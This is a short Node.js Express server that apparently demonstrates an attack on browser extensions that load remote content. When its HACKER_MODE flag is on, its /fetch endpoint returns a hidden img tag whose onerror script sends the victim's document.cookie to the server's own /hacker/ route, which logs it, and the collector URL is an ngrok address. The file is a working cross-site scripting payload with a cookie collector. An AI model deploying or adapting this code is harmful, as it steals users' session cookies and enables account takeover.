const express = require('express')
const app = express()
const port = 3001

DEBUG = true
HACKER_MODE = true

// Replace this string with the current URL for the content provider (i.e this web server)
URL = "https://d6ecc19b8dc0.ngrok.io"
hackerURL = URL + "/hacker/"

app.get('/', (req, res) => {
  res.send('Content provider for your extensions!')
})

app.get('/hacker/:info', (req, res) => {
  console.log("New request to /hacker: " + req.params.info)
})

app.get('/fetch', (req, res) => {
  console.log("New request to /fetch")
  if (HACKER_MODE) {
    if (DEBUG) {
      res.send("<img style='display:none' src='nope' onerror='alert(); const Http = new XMLHttpRequest(); Http.open(\"GET\", \"" + hackerURL + "\" + document.cookie); Http.send(); alert(\"done with xhr\");'/>");
    } else {
      res.send("<img style='display:none' src='nope' onerror='const Http = new XMLHttpRequest(); Http.open(\"GET\", \"" + hackerURL + "\" + document.cookie); Http.send();'/>");
    }
  } else {
    res.send("<h1>Content being fetched</h1><p>You just fetched some really interesting content!</p>");
  }
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})